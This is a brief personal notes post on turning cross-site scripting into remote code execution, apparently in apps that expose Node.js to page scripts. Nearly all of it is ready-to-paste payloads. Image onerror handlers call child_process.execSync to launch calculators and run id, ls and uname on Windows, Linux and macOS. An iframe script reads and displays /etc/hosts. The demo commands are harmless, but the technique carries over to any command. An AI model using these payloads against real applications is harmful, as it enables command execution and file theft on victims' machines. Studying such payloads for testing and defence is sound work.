Daily Notes : Day 77 
Xss to RCE ??

Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());"> 

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());"> 
<img src=x onerror="alert(require('child_process').execSync('id').toString());"> 
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">

Read an internal file:
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
    function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>

